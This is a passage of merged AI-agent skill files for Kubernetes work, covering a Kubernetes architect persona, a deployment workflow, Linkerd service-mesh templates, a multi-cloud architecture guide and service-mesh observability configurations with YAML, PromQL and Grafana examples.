- Implement resource limits, health checks, and security contexts
- Design manifests for multi-environment deployments

## Do not use this skill when

- The task is unrelated to kubernetes manifest generator
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Resources

- `resources/implementation-playbook.md` for detailed patterns and examples.

---

## Merged Reference (legacy variant)

---
name: kubernetes-architect
description: Expert Kubernetes architect specializing in cloud-native infrastructure, advanced GitOps workflows (ArgoCD/Flux), and enterprise container orchestration.
risk: unknown
source: community
date_added: '2026-02-27'
---
You are a Kubernetes architect specializing in cloud-native infrastructure, modern GitOps workflows, and enterprise container orchestration at scale.

## Use this skill when

- Designing Kubernetes platform architecture or multi-cluster strategy
- Implementing GitOps workflows and progressive delivery
- Planning service mesh, security, or multi-tenancy patterns
- Improving reliability, cost, or developer experience in K8s

## Do not use this skill when

- You only need a local dev cluster or single-node setup
- You are troubleshooting application code without platform changes
- You are not using Kubernetes or container orchestration

## Instructions

1. Gather workload requirements, compliance needs, and scale targets.
2. Define cluster topology, networking, and security boundaries.
3. Choose GitOps tooling and delivery strategy for rollouts.
4. Validate with staging and define rollback and upgrade plans.

## Safety

- Avoid production changes without approvals and rollback plans.
- Test policy changes and admission controls in staging first.

## Purpose
Expert Kubernetes architect with comprehensive knowledge of container orchestration, cloud-native technologies, and modern GitOps practices. Masters Kubernetes across all major providers (EKS, AKS, GKE) and on-premises deployments. Specializes in building scalable, secure, and cost-effective platform engineering solutions that enhance developer productivity.

## Capabilities

### Kubernetes Platform Expertise
- **Managed Kubernetes**: EKS (AWS), AKS (Azure), GKE (Google Cloud), advanced configuration and optimization
- **Enterprise Kubernetes**: Red Hat OpenShift, Rancher, VMware Tanzu, platform-specific features
- **Self-managed clusters**: kubeadm, kops, kubespray, bare-metal installations, air-gapped deployments
- **Cluster lifecycle**: Upgrades, node management, etcd operations, backup/restore strategies
- **Multi-cluster management**: Cluster API, fleet management, cluster federation, cross-cluster networking

### GitOps & Continuous Deployment
- **GitOps tools**: ArgoCD, Flux v2, Jenkins X, Tekton, advanced configuration and best practices
- **OpenGitOps principles**: Declarative, versioned, automatically pulled, continuously reconciled
- **Progressive delivery**: Argo Rollouts, Flagger, canary deployments, blue/green strategies, A/B testing
- **GitOps repository patterns**: App-of-apps, mono-repo vs multi-repo, environment promotion strategies
- **Secret management**: External Secrets Operator, Sealed Secrets, HashiCorp Vault integration

### Modern Infrastructure as Code
- **Kubernetes-native IaC**: Helm 3.x, Kustomize, Jsonnet, cdk8s, Pulumi Kubernetes provider
- **Cluster provisioning**: Terraform/OpenTofu modules, Cluster API, infrastructure automation
- **Configuration management**: Advanced Helm patterns, Kustomize overlays, environment-specific configs
- **Policy as Code**: Open Policy Agent (OPA), Gatekeeper, Kyverno, Falco rules, admission controllers
- **GitOps workflows**: Automated testing, validation pipelines, drift detection and remediation

### Cloud-Native Security
- **Pod Security Standards**: Restricted, baseline, privileged policies, migration strategies
- **Network security**: Network policies, service mesh security, micro-segmentation
- **Runtime security**: Falco, Sysdig, Aqua Security, runtime threat detection
- **Image security**: Container scanning, admission controllers, vulnerability management
- **Supply chain security**: SLSA, Sigstore, image signing, SBOM generation
- **Compliance**: CIS benchmarks, NIST frameworks, regulatory compliance automation

### Service Mesh Architecture
- **Istio**: Advanced traffic management, security policies, observability, multi-cluster mesh
- **Linkerd**: Lightweight service mesh, automatic mTLS, traffic splitting
- **Cilium**: eBPF-based networking, network policies, load balancing
- **Consul Connect**: Service mesh with HashiCorp ecosystem integration
- **Gateway API**: Next-generation ingress, traffic routing, protocol support

### Container & Image Management
- **Container runtimes**: containerd, CRI-O, Docker runtime considerations
- **Registry strategies**: Harbor, ECR, ACR, GCR, multi-region replication
- **Image optimization**: Multi-stage builds, distroless images, security scanning
- **Build strategies**: BuildKit, Cloud Native Buildpacks, Tekton pipelines, Kaniko
- **Artifact management**: OCI artifacts, Helm chart repositories, policy distribution

### Observability & Monitoring
- **Metrics**: Prometheus, VictoriaMetrics, Thanos for long-term storage
- **Logging**: Fluentd, Fluent Bit, Loki, centralized logging strategies
- **Tracing**: Jaeger, Zipkin, OpenTelemetry, distributed tracing patterns
- **Visualization**: Grafana, custom dashboards, alerting strategies
- **APM integration**: DataDog, New Relic, Dynatrace Kubernetes-specific monitoring

### Multi-Tenancy & Platform Engineering
- **Namespace strategies**: Multi-tenancy patterns, resource isolation, network segmentation
- **RBAC design**: Advanced authorization, service accounts, cluster roles, namespace roles
- **Resource management**: Resource quotas, limit ranges, priority classes, QoS classes
- **Developer platforms**: Self-service provisioning, developer portals, abstract infrastructure complexity
- **Operator development**: Custom Resource Definitions (CRDs), controller patterns, Operator SDK

### Scalability & Performance
- **Cluster autoscaling**: Horizontal Pod Autoscaler (HPA), Vertical Pod Autoscaler (VPA), Cluster Autoscaler
- **Custom metrics**: KEDA for event-driven autoscaling, custom metrics APIs
- **Performance tuning**: Node optimization, resource allocation, CPU/memory management
- **Load balancing**: Ingress controllers, service mesh load balancing, external load balancers
- **Storage**: Persistent volumes, storage classes, CSI drivers, data management

### Cost Optimization & FinOps
- **Resource optimization**: Right-sizing workloads, spot instances, reserved capacity
- **Cost monitoring**: KubeCost, OpenCost, native cloud cost allocation
- **Bin packing**: Node utilization optimization, workload density
- **Cluster efficiency**: Resource requests/limits optimization, over-provisioning analysis
- **Multi-cloud cost**: Cross-provider cost analysis, workload placement optimization

### Disaster Recovery & Business Continuity
- **Backup strategies**: Velero, cloud-native backup solutions, cross-region backups
- **Multi-region deployment**: Active-active, active-passive, traffic routing
- **Chaos engineering**: Chaos Monkey, Litmus, fault injection testing
- **Recovery procedures**: RTO/RPO planning, automated failover, disaster recovery testing

## OpenGitOps Principles (CNCF)
1. **Declarative** - Entire system described declaratively with desired state
2. **Versioned and Immutable** - Desired state stored in Git with complete version history
3. **Pulled Automatically** - Software agents automatically pull desired state from Git
4. **Continuously Reconciled** - Agents continuously observe and reconcile actual vs desired state

## Behavioral Traits
- Champions Kubernetes-first approaches while recognizing appropriate use cases
- Implements GitOps from project inception, not as an afterthought
- Prioritizes developer experience and platform usability
- Emphasizes security by default with defense in depth strategies
- Designs for multi-cluster and multi-region resilience
- Advocates for progressive delivery and safe deployment practices
- Focuses on cost optimization and resource efficiency
- Promotes observability and monitoring as foundational capabilities
- Values automation and Infrastructure as Code for all operations
- Considers compliance and governance requirements in architecture decisions

## Knowledge Base
- Kubernetes architecture and component interactions
- CNCF landscape and cloud-native technology ecosystem
- GitOps patterns and best practices
- Container security and supply chain best practices
- Service mesh architectures and trade-offs
- Platform engineering methodologies
- Cloud provider Kubernetes services and integrations
- Observability patterns and tools for containerized environments
- Modern CI/CD practices and pipeline security

## Response Approach
1. **Assess workload requirements** for container orchestration needs
2. **Design Kubernetes architecture** appropriate for scale and complexity
3. **Implement GitOps workflows** with proper repository structure and automation
4. **Configure security policies** with Pod Security Standards and network policies
5. **Set up observability stack** with metrics, logs, and traces
6. **Plan for scalability** with appropriate autoscaling and resource management
7. **Consider multi-tenancy** requirements and namespace isolation
8. **Optimize for cost** with right-sizing and efficient resource utilization
9. **Document platform** with clear operational procedures and developer guides

## Example Interactions
- "Design a multi-cluster Kubernetes platform with GitOps for a financial services company"
- "Implement progressive delivery with Argo Rollouts and service mesh traffic splitting"
- "Create a secure multi-tenant Kubernetes platform with namespace isolation and RBAC"
- "Design disaster recovery for stateful applications across multiple Kubernetes clusters"
- "Optimize Kubernetes costs while maintaining performance and availability SLAs"
- "Implement observability stack with Prometheus, Grafana, and OpenTelemetry for microservices"
- "Create CI/CD pipeline with GitOps for container applications with security scanning"
- "Design Kubernetes operator for custom application lifecycle management"

---

## Merged Reference (legacy variant)

---
name: kubernetes-deployment
description: "Kubernetes deployment workflow for container orchestration, Helm charts, service mesh, and production-ready K8s configurations."
category: granular-workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Kubernetes Deployment Workflow

## Overview

Specialized workflow for deploying applications to Kubernetes including container orchestration, Helm charts, service mesh configuration, and production-ready K8s patterns.

## When to Use This Workflow

Use this workflow when:
- Deploying to Kubernetes
- Creating Helm charts
- Configuring service mesh
- Setting up K8s networking
- Implementing K8s security

## Workflow Phases

### Phase 1: Container Preparation

#### Skills to Invoke
- `docker-expert` - Docker containerization
- `k8s-manifest-generator` - K8s manifests

#### Actions
1. Create Dockerfile
2. Build container image
3. Optimize image size
4. Push to registry
5. Test container

#### Copy-Paste Prompts
```
Use @docker-expert to containerize application for K8s
```

### Phase 2: K8s Manifests

#### Skills to Invoke
- `k8s-manifest-generator` - Manifest generation
- `kubernetes-architect` - K8s architecture

#### Actions
1. Create Deployment
2. Configure Service
3. Set up ConfigMap
4. Create Secrets
5. Add Ingress

#### Copy-Paste Prompts
```
Use @k8s-manifest-generator to create K8s manifests
```

### Phase 3: Helm Chart

#### Skills to Invoke
- `helm-chart-scaffolding` - Helm charts

#### Actions
1. Create chart structure
2. Define values.yaml
3. Add templates
4. Configure dependencies
5. Test chart

#### Copy-Paste Prompts
```
Use @helm-chart-scaffolding to create Helm chart
```

### Phase 4: Service Mesh

#### Skills to Invoke
- `istio-traffic-management` - Istio
- `linkerd-patterns` - Linkerd
- `service-mesh-expert` - Service mesh

#### Actions
1. Choose service mesh
2. Install mesh
3. Configure traffic management
4. Set up mTLS
5. Add observability

#### Copy-Paste Prompts
```
Use @istio-traffic-management to configure Istio
```

### Phase 5: Security

#### Skills to Invoke
- `k8s-security-policies` - K8s security
- `mtls-configuration` - mTLS

#### Actions
1. Configure RBAC
2. Set up NetworkPolicy
3. Enable PodSecurity
4. Configure secrets
5. Implement mTLS

#### Copy-Paste Prompts
```
Use @k8s-security-policies to secure Kubernetes cluster
```

### Phase 6: Observability

#### Skills to Invoke
- `grafana-dashboards` - Grafana
- `prometheus-configuration` - Prometheus

#### Actions
1. Install monitoring stack
2. Configure Prometheus
3. Create Grafana dashboards
4. Set up alerts
5. Add distributed tracing

#### Copy-Paste Prompts
```
Use @prometheus-configuration to set up K8s monitoring
```

### Phase 7: Deployment

#### Skills to Invoke
- `deployment-engineer` - Deployment
- `gitops-workflow` - GitOps

#### Actions
1. Configure CI/CD
2. Set up GitOps
3. Deploy to cluster
4. Verify deployment
5. Monitor rollout

#### Copy-Paste Prompts
```
Use @gitops-workflow to implement GitOps deployment
```

## Quality Gates

- [ ] Containers working
- [ ] Manifests valid
- [ ] Helm chart installs
- [ ] Security configured
- [ ] Monitoring active
- [ ] Deployment successful

## Related Workflow Bundles

- `cloud-devops` - Cloud/DevOps
- `terraform-infrastructure` - Infrastructure
- `docker-containerization` - Containers

---

## Merged Reference (legacy variant)

---
name: linkerd-patterns
description: "Implement Linkerd service mesh patterns for lightweight, security-focused service mesh deployments. Use when setting up Linkerd, configuring traffic policies, or implementing zero-trust networking ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Linkerd Patterns

Production patterns for Linkerd service mesh - the lightweight, security-first service mesh for Kubernetes.

## Do not use this skill when

- The task is unrelated to linkerd patterns
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Setting up a lightweight service mesh
- Implementing automatic mTLS
- Configuring traffic splits for canary deployments
- Setting up service profiles for per-route metrics
- Implementing retries and timeouts
- Multi-cluster service mesh

## Core Concepts

### 1. Linkerd Architecture

```
┌─────────────────────────────────────────────┐
│                Control Plane                 │
│  ┌─────────┐ ┌──────────┐ ┌──────────────┐ │
│  │ destiny │ │ identity │ │ proxy-inject │ │
│  └─────────┘ └──────────┘ └──────────────┘ │
└─────────────────────────────────────────────┘
                      │
┌─────────────────────────────────────────────┐
│                 Data Plane                   │
│  ┌─────┐    ┌─────┐    ┌─────┐             │
│  │proxy│────│proxy│────│proxy│             │
│  └─────┘    └─────┘    └─────┘             │
│     │           │           │               │
│  ┌──┴──┐    ┌──┴──┐    ┌──┴──┐            │
│  │ app │    │ app │    │ app │            │
│  └─────┘    └─────┘    └─────┘            │
└─────────────────────────────────────────────┘
```

### 2. Key Resources

| Resource | Purpose |
|----------|---------|
| **ServiceProfile** | Per-route metrics, retries, timeouts |
| **TrafficSplit** | Canary deployments, A/B testing |
| **Server** | Define server-side policies |
| **ServerAuthorization** | Access control policies |

## Templates

### Template 1: Mesh Installation

```bash
# Install CLI
curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh

# Validate cluster
linkerd check --pre

# Install CRDs
linkerd install --crds | kubectl apply -f -

# Install control plane
linkerd install | kubectl apply -f -

# Verify installation
linkerd check

# Install viz extension (optional)
linkerd viz install | kubectl apply -f -
```

### Template 2: Inject Namespace

```yaml
# Automatic injection for namespace
apiVersion: v1
kind: Namespace
metadata:
  name: my-app
  annotations:
    linkerd.io/inject: enabled
---
# Or inject specific deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
  annotations:
    linkerd.io/inject: enabled
spec:
  template:
    metadata:
      annotations:
        linkerd.io/inject: enabled
```

### Template 3: Service Profile with Retries

```yaml
apiVersion: linkerd.io/v1alpha2
kind: ServiceProfile
metadata:
  name: my-service.my-namespace.svc.cluster.local
  namespace: my-namespace
spec:
  routes:
    - name: GET /api/users
      condition:
        method: GET
        pathRegex: /api/users
      responseClasses:
        - condition:
            status:
              min: 500
              max: 599
          isFailure: true
      isRetryable: true
    - name: POST /api/users
      condition:
        method: POST
        pathRegex: /api/users
      # POST not retryable by default
      isRetryable: false
    - name: GET /api/users/{id}
      condition:
        method: GET
        pathRegex: /api/users/[^/]+
      timeout: 5s
      isRetryable: true
  retryBudget:
    retryRatio: 0.2
    minRetriesPerSecond: 10
    ttl: 10s
```

### Template 4: Traffic Split (Canary)

```yaml
apiVersion: split.smi-spec.io/v1alpha1
kind: TrafficSplit
metadata:
  name: my-service-canary
  namespace: my-namespace
spec:
  service: my-service
  backends:
    - service: my-service-stable
      weight: 900m  # 90%
    - service: my-service-canary
      weight: 100m  # 10%
```

### Template 5: Server Authorization Policy

```yaml
# Define the server
apiVersion: policy.linkerd.io/v1beta1
kind: Server
metadata:
  name: my-service-http
  namespace: my-namespace
spec:
  podSelector:
    matchLabels:
      app: my-service
  port: http
  proxyProtocol: HTTP/1
---
# Allow traffic from specific clients
apiVersion: policy.linkerd.io/v1beta1
kind: ServerAuthorization
metadata:
  name: allow-frontend
  namespace: my-namespace
spec:
  server:
    name: my-service-http
  client:
    meshTLS:
      serviceAccounts:
        - name: frontend
          namespace: my-namespace
---
# Allow unauthenticated traffic (e.g., from ingress)
apiVersion: policy.linkerd.io/v1beta1
kind: ServerAuthorization
metadata:
  name: allow-ingress
  namespace: my-namespace
spec:
  server:
    name: my-service-http
  client:
    unauthenticated: true
    networks:
      - cidr: 10.0.0.0/8
```

### Template 6: HTTPRoute for Advanced Routing

```yaml
apiVersion: policy.linkerd.io/v1beta2
kind: HTTPRoute
metadata:
  name: my-route
  namespace: my-namespace
spec:
  parentRefs:
    - name: my-service
      kind: Service
      group: core
      port: 8080
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api/v2
        - headers:
            - name: x-api-version
              value: v2
      backendRefs:
        - name: my-service-v2
          port: 8080
    - matches:
        - path:
            type: PathPrefix
            value: /api
      backendRefs:
        - name: my-service-v1
          port: 8080
```

### Template 7: Multi-cluster Setup

```bash
# On each cluster, install with cluster credentials
linkerd multicluster install | kubectl apply -f -

# Link clusters
linkerd multicluster link --cluster-name west \
  --api-server-address https://west.example.com:6443 \
  | kubectl apply -f -

# Export a service to other clusters
kubectl label svc/my-service mirror.linkerd.io/exported=true

# Verify cross-cluster connectivity
linkerd multicluster check
linkerd multicluster gateways
```

## Monitoring Commands

```bash
# Live traffic view
linkerd viz top deploy/my-app

# Per-route metrics
linkerd viz routes deploy/my-app

# Check proxy status
linkerd viz stat deploy -n my-namespace

# View service dependencies
linkerd viz edges deploy -n my-namespace

# Dashboard
linkerd viz dashboard
```

## Debugging

```bash
# Check injection status
linkerd check --proxy -n my-namespace

# View proxy logs
kubectl logs deploy/my-app -c linkerd-proxy

# Debug identity/TLS
linkerd identity -n my-namespace

# Tap traffic (live)
linkerd viz tap deploy/my-app --to deploy/my-backend
```

## Best Practices

### Do's
- **Enable mTLS everywhere** - It's automatic with Linkerd
- **Use ServiceProfiles** - Get per-route metrics and retries
- **Set retry budgets** - Prevent retry storms
- **Monitor golden metrics** - Success rate, latency, throughput

### Don'ts
- **Don't skip check** - Always run `linkerd check` after changes
- **Don't over-configure** - Linkerd defaults are sensible
- **Don't ignore ServiceProfiles** - They unlock advanced features
- **Don't forget timeouts** - Set appropriate values per route

## Resources

- [Linkerd Documentation](https://linkerd.io/2.14/overview/)
- [Service Profiles](https://linkerd.io/2.14/features/service-profiles/)
- [Authorization Policy](https://linkerd.io/2.14/features/server-policy/)

---

## Merged Reference (legacy variant)

---
name: multi-cloud-architecture
description: "Design multi-cloud architectures using a decision framework to select and integrate services across AWS, Azure, and GCP. Use when building multi-cloud systems, avoiding vendor lock-in, or leveragin..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Multi-Cloud Architecture

Decision framework and patterns for architecting applications across AWS, Azure, and GCP.

## Do not use this skill when

- The task is unrelated to multi-cloud architecture
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Design cloud-agnostic architectures and make informed decisions about service selection across cloud providers.

## Use this skill when

- Design multi-cloud strategies
- Migrate between cloud providers
- Select cloud services for specific workloads
- Implement cloud-agnostic architectures
- Optimize costs across providers

## Cloud Service Comparison

### Compute Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| EC2 | Virtual Machines | Compute Engine | IaaS VMs |
| ECS | Container Instances | Cloud Run | Containers |
| EKS | AKS | GKE | Kubernetes |
| Lambda | Functions | Cloud Functions | Serverless |
| Fargate | Container Apps | Cloud Run | Managed containers |

### Storage Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| S3 | Blob Storage | Cloud Storage | Object storage |
| EBS | Managed Disks | Persistent Disk | Block storage |
| EFS | Azure Files | Filestore | File storage |
| Glacier | Archive Storage | Archive Storage | Cold storage |

### Database Services

| AWS | Azure | GCP | Use Case |
|-----|-------|-----|----------|
| RDS | SQL Database | Cloud SQL | Managed SQL |
| DynamoDB | Cosmos DB | Firestore | NoSQL |
| Aurora | PostgreSQL/MySQL | Cloud Spanner | Distributed SQL |
| ElastiCache | Cache for Redis | Memorystore | Caching |

**Reference:** See `references/service-comparison.md` for complete comparison

## Multi-Cloud Patterns

### Pattern 1: Single Provider with DR

- Primary workload in one cloud
- Disaster recovery in another
- Database replication across clouds
- Automated failover

### Pattern 2: Best-of-Breed

- Use best service from each provider
- AI/ML on GCP
- Enterprise apps on Azure
- General compute on AWS

### Pattern 3: Geographic Distribution

- Serve users from nearest cloud region
- Data sovereignty compliance
- Global load balancing
- Regional failover

### Pattern 4: Cloud-Agnostic Abstraction

- Kubernetes for compute
- PostgreSQL for database
- S3-compatible storage (MinIO)
- Open source tools

## Cloud-Agnostic Architecture

### Use Cloud-Native Alternatives

- **Compute:** Kubernetes (EKS/AKS/GKE)
- **Database:** PostgreSQL/MySQL (RDS/SQL Database/Cloud SQL)
- **Message Queue:** Apache Kafka (MSK/Event Hubs/Confluent)
- **Cache:** Redis (ElastiCache/Azure Cache/Memorystore)
- **Object Storage:** S3-compatible API
- **Monitoring:** Prometheus/Grafana
- **Service Mesh:** Istio/Linkerd

### Abstraction Layers

```
Application Layer
    ↓
Infrastructure Abstraction (Terraform)
    ↓
Cloud Provider APIs
    ↓
AWS / Azure / GCP
```

## Cost Comparison

### Compute Pricing Factors

- **AWS:** On-demand, Reserved, Spot, Savings Plans
- **Azure:** Pay-as-you-go, Reserved, Spot
- **GCP:** On-demand, Committed use, Preemptible

### Cost Optimization Strategies

1. Use reserved/committed capacity (30-70% savings)
2. Leverage spot/preemptible instances
3. Right-size resources
4. Use serverless for variable workloads
5. Optimize data transfer costs
6. Implement lifecycle policies
7. Use cost allocation tags
8. Monitor with cloud cost tools

**Reference:** See `references/multi-cloud-patterns.md`

## Migration Strategy

### Phase 1: Assessment
- Inventory current infrastructure
- Identify dependencies
- Assess cloud compatibility
- Estimate costs

### Phase 2: Pilot
- Select pilot workload
- Implement in target cloud
- Test thoroughly
- Document learnings

### Phase 3: Migration
- Migrate workloads incrementally
- Maintain dual-run period
- Monitor performance
- Validate functionality

### Phase 4: Optimization
- Right-size resources
- Implement cloud-native services
- Optimize costs
- Enhance security

## Best Practices

1. **Use infrastructure as code** (Terraform/OpenTofu)
2. **Implement CI/CD pipelines** for deployments
3. **Design for failure** across clouds
4. **Use managed services** when possible
5. **Implement comprehensive monitoring**
6. **Automate cost optimization**
7. **Follow security best practices**
8. **Document cloud-specific configurations**
9. **Test disaster recovery** procedures
10. **Train teams** on multiple clouds

## Reference Files

- `references/service-comparison.md` - Complete service comparison
- `references/multi-cloud-patterns.md` - Architecture patterns

## Related Skills

- `terraform-module-library` - For IaC implementation
- `cost-optimization` - For cost management
- `hybrid-cloud-networking` - For connectivity

---

## Merged Reference (legacy variant)

---
name: service-mesh-expert
description: "Expert service mesh architect specializing in Istio, Linkerd, and cloud-native networking patterns. Masters traffic management, security policies, observability integration, and multi-cluster mesh con"
risk: unknown
source: community
date_added: "2026-02-27"
---

# Service Mesh Expert

Expert service mesh architect specializing in Istio, Linkerd, and cloud-native networking patterns. Masters traffic management, security policies, observability integration, and multi-cluster mesh configurations. Use PROACTIVELY for service mesh architecture, zero-trust networking, or microservices communication patterns.

## Do not use this skill when

- The task is unrelated to service mesh expert
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Capabilities

- Istio and Linkerd installation, configuration, and optimization
- Traffic management: routing, load balancing, circuit breaking, retries
- mTLS configuration and certificate management
- Service mesh observability with distributed tracing
- Multi-cluster and multi-cloud mesh federation
- Progressive delivery with canary and blue-green deployments
- Security policies and authorization rules

## Use this skill when

- Implementing service-to-service communication in Kubernetes
- Setting up zero-trust networking with mTLS
- Configuring traffic splitting for canary deployments
- Debugging service mesh connectivity issues
- Implementing rate limiting and circuit breakers
- Setting up cross-cluster service discovery

## Workflow

1. Assess current infrastructure and requirements
2. Design mesh topology and traffic policies
3. Implement security policies (mTLS, AuthorizationPolicy)
4. Configure observability (metrics, traces, logs)
5. Set up traffic management rules
6. Test failover and resilience patterns
7. Document operational runbooks

## Best Practices

- Start with permissive mode, gradually enforce strict mTLS
- Use namespaces for policy isolation
- Implement circuit breakers before they're needed
- Monitor mesh overhead (latency, resource usage)
- Keep sidecar resources appropriately sized
- Use destination rules for consistent load balancing

---

## Merged Reference (legacy variant)

---
name: service-mesh-observability
description: "Implement comprehensive observability for service meshes including distributed tracing, metrics, and visualization. Use when setting up mesh monitoring, debugging latency issues, or implementing SL..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Service Mesh Observability

Complete guide to observability patterns for Istio, Linkerd, and service mesh deployments.

## Do not use this skill when

- The task is unrelated to service mesh observability
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Setting up distributed tracing across services
- Implementing service mesh metrics and dashboards
- Debugging latency and error issues
- Defining SLOs for service communication
- Visualizing service dependencies
- Troubleshooting mesh connectivity

## Core Concepts

### 1. Three Pillars of Observability

```
┌─────────────────────────────────────────────────────┐
│                  Observability                       │
├─────────────────┬─────────────────┬─────────────────┤
│     Metrics     │     Traces      │      Logs       │
│                 │                 │                 │
│ • Request rate  │ • Span context  │ • Access logs   │
│ • Error rate    │ • Latency       │ • Error details │
│ • Latency P50   │ • Dependencies  │ • Debug info    │
│ • Saturation    │ • Bottlenecks   │ • Audit trail   │
└─────────────────┴─────────────────┴─────────────────┘
```

### 2. Golden Signals for Mesh

| Signal | Description | Alert Threshold |
|--------|-------------|-----------------|
| **Latency** | Request duration P50, P99 | P99 > 500ms |
| **Traffic** | Requests per second | Anomaly detection |
| **Errors** | 5xx error rate | > 1% |
| **Saturation** | Resource utilization | > 80% |

## Templates

### Template 1: Istio with Prometheus & Grafana

```yaml
# Install Prometheus
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus
  namespace: istio-system
data:
  prometheus.yml: |
    global:
      scrape_interval: 15s
    scrape_configs:
      - job_name: 'istio-mesh'
        kubernetes_sd_configs:
          - role: endpoints
            namespaces:
              names:
                - istio-system
        relabel_configs:
          - source_labels: [__meta_kubernetes_service_name]
            action: keep
            regex: istio-telemetry
---
# ServiceMonitor for Prometheus Operator
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: istio-mesh
  namespace: istio-system
spec:
  selector:
    matchLabels:
      app: istiod
  endpoints:
    - port: http-monitoring
      interval: 15s
```

### Template 2: Key Istio Metrics Queries

```promql
# Request rate by service
sum(rate(istio_requests_total{reporter="destination"}[5m])) by (destination_service_name)

# Error rate (5xx)
sum(rate(istio_requests_total{reporter="destination", response_code=~"5.."}[5m]))
  / sum(rate(istio_requests_total{reporter="destination"}[5m])) * 100

# P99 latency
histogram_quantile(0.99,
  sum(rate(istio_request_duration_milliseconds_bucket{reporter="destination"}[5m]))
  by (le, destination_service_name))

# TCP connections
sum(istio_tcp_connections_opened_total{reporter="destination"}) by (destination_service_name)

# Request size
histogram_quantile(0.99,
  sum(rate(istio_request_bytes_bucket{reporter="destination"}[5m]))
  by (le, destination_service_name))
```

### Template 3: Jaeger Distributed Tracing

```yaml
# Jaeger installation for Istio
apiVersion: install.istio.io/v1alpha1
kind: IstioOperator
spec:
  meshConfig:
    enableTracing: true
    defaultConfig:
      tracing:
        sampling: 100.0  # 100% in dev, lower in prod
        zipkin:
          address: jaeger-collector.istio-system:9411
---
# Jaeger deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jaeger
  namespace: istio-system
spec:
  selector:
    matchLabels:
      app: jaeger
  template:
    metadata:
      labels:
        app: jaeger
    spec:
      containers:
        - name: jaeger
          image: jaegertracing/all-in-one:1.50
          ports:
            - containerPort: 5775   # UDP
            - containerPort: 6831   # Thrift
            - containerPort: 6832   # Thrift
            - containerPort: 5778   # Config
            - containerPort: 16686  # UI
            - containerPort: 14268  # HTTP
            - containerPort: 14250  # gRPC
            - containerPort: 9411   # Zipkin
          env:
            - name: COLLECTOR_ZIPKIN_HOST_PORT
              value: ":9411"
```

### Template 4: Linkerd Viz Dashboard

```bash
# Install Linkerd viz extension
linkerd viz install | kubectl apply -f -

# Access dashboard
linkerd viz dashboard

# CLI commands for observability
# Top requests
linkerd viz top deploy/my-app

# Per-route metrics
linkerd viz routes deploy/my-app --to deploy/backend

# Live traffic inspection
linkerd viz tap deploy/my-app --to deploy/backend

# Service edges (dependencies)
linkerd viz edges deployment -n my-namespace
```

### Template 5: Grafana Dashboard JSON

```json
{
  "dashboard": {
    "title": "Service Mesh Overview",
    "panels": [
      {
        "title": "Request Rate",
        "type": "graph",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{reporter=\"destination\"}[5m])) by (destination_service_name)",
            "legendFormat": "{{destination_service_name}}"
          }
        ]
      },
      {
        "title": "Error Rate",
        "type": "gauge",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{response_code=~\"5..\"}[5m])) / sum(rate(istio_requests_total[5m])) * 100"
          }
        ],
        "fieldConfig": {
          "defaults": {
            "thresholds": {
              "steps": [
                {"value": 0, "color": "green"},
                {"value": 1, "color": "yellow"},
                {"value": 5, "color": "red"}
              ]
            }
          }
        }
      },
      {
        "title": "P99 Latency",
        "type": "graph",
        "targets": [
          {
            "expr": "histogram_quantile(0.99, sum(rate(istio_request_duration_milliseconds_bucket{reporter=\"destination\"}[5m])) by (le, destination_service_name))",
            "legendFormat": "{{destination_service_name}}"
          }
        ]
      },
      {
        "title": "Service Topology",
        "type": "nodeGraph",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{reporter=\"destination\"}[5m])) by (source_workload, destination_service_name)"
          }
        ]
      }
    ]
  }
}
```

### Template 6: Kiali Service Mesh Visualization

```yaml
# Kiali installation
apiVersion: kiali.io/v1alpha1
kind: Kiali
metadata:
  name: kiali
  namespace: istio-system
spec:
  auth:
    strategy: anonymous  # or openid, token
  deployment:
    accessible_namespaces:
      - "**"
  external_services:
    prometheus:
      url: http://prometheus.istio-system:9090
    tracing:
      url: http://jaeger-query.istio-system:16686
    grafana:
      url: http://grafana.istio-system:3000
```

### Template 7: OpenTelemetry Integration

```yaml
# OpenTelemetry Collector for mesh
apiVersion: v1
kind: ConfigMap
metadata:
  name: otel-collector-config
data:
  config.yaml: |
    receivers:
      otlp:
        protocols:
          grpc:
            endpoint: 0.0.0.0:4317
          http:
            endpoint: 0.0.0.0:4318
      zipkin:
        endpoint: 0.0.0.0:9411

    processors:
      batch:
        timeout: 10s

    exporters:
      jaeger:
        endpoint: jaeger-collector:14250
        tls:
          insecure: true
      prometheus:
        endpoint: 0.0.0.0:8889

    service:
      pipelines:
        traces:
          receivers: [otlp, zipkin]
          processors: [batch]
          exporters: [jaeger]
        metrics:
          receivers: [otlp]
          processors: [batch]
          exporters: [prometheus]
---
# Istio Telemetry v2 with OTel
apiVersion: telemetry.istio.io/v1alpha1
kind: Telemetry
metadata:
